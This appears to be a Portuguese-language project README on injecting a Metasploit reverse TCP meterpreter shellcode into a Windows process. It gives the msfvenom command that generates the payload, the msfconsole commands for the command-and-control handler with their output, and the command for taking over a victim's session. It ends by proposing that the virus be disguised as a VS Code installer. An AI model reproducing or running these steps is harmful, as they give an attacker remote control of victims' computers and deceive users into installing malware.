# ShellCode Injection of an Reverse TCP exploit

## Passos de funcionamento
* Obter o controlo de um processo, ou criar um (como se pretende no ficheiro process_injection_paint.cpp);
* Alocar um buffer na memória do processo com as permissões necessárias;
* Escrever o conteúdo do shellcode no buffer alocado na memória do processo;
* Criar uma thread que correrá o que foi alocado e escrito no processo.

## Criar o ShellCode

Para criar o shell code foi usada a framework Metasploit. Com esta framework o shellcode é criado com apenas um comando:

```console
foo@bar:~$ msfvenom --platform windows --arch x64 -p windows/x64/meterpreter LHOST="o nosso IP" LPORT="porta de acesso" -f c --var-name=shellCode
```

## Iniciar o handler de metasploit
Vamos usar o metasploit como um servidor de Command & Control

```console
foo@bar:~$ msfconsole
msf6 > use exploit/multi/handler
msf6 > set payload windows/x64/meterpreter/reverse_tcp
msf6 > set lhost eth0
msf6 > set lport 1234
msf6 > run -j
```

### Resultado:

```console
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost eth0
lhost => eth0
msf6 exploit(multi/handler) > set lport 1234
lport => 1234
msf6 exploit(multi/handler) > run -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
msf6 exploit(multi/handler) >
[*] Started reverse TCP handler on 172.18.16.86:1234
```

## Quando a vitima já estabeleceu conexão com o server:

```console
msf6 exploit(multi/handler) > sessions -i 1
```
Depois podemos executar os comandos que quisermos até a conexão ser fechada.

## Exemplo de como um destes ataques podia ser realizado

Uma das possibilidades que nos surgiu para realizar um ataque deste tipo foi mascarar o virus como um instalador de um qualquer programa (p.e. vscode).

Ao ter a possibilidade de correr comandos na consola de windows de forma programatica o vscode seria instalado através do terminal.

Assim quando a vitima instalasse o vscode e este fosse aberto seria identificado o PID do mesmo por forma ao shellcode ser alocado no processo do mesmo.








